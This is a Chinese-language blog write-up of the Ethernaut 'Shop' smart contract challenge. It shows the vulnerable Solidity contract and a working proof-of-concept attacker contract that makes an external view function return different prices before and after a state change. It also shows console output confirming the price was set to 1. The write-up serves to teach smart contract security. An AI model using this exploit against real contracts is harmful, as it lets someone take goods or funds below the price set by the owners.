---
title: '函数标识符pure和view-2'
date: 2022-12-19 13:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'
---

<!-- more -->

#### 第二十一关Shop 思路与POC

#### 目标: 改变pirce变量数值使其低于100并能使isSold变量为true

##### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//很明显问题在于你怎么实现这个price函数
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);
 /*
根据第11关我们知道view/pure标识符就是限制函数不能够在不同的形参输入下改变结果(不能改变函数的状态),但是此处是并没有输入的。
那么如何绕过这个判断就成了一个脑筋急转弯的问题。
 我们需要找到一个flag能够使我们自己实现的price函数返回不同的结果. 显然这里的isSold就是最好的flag
 */
    if (_buyer.price() >= price && !isSold) {
    //卖出一个商品(根据用户输入改变存储数据)第一条代码是验证用户输入然后就应该立刻先完成存储数据的变更
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

##### poc思路:point_right:：我们仅需要根据商品售没售出这个布尔值更改price函数返回的结果即可

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerability/Shop.sol";

contract hackShop {
    Shop shop = Shop(0x686da930FE2Ccde0A069AFEA8aE676eF6B4aAd91);

    function hackbuy() public {
        shop.buy();
    }
   //根据isSold变量改变函数返回
    function price() external view returns (uint) {
       return shop.isSold() ? 1 : 101;
    }
}

```

```js
//查看price变量,成功修改
(await contract.price()).toString()
'1'
```

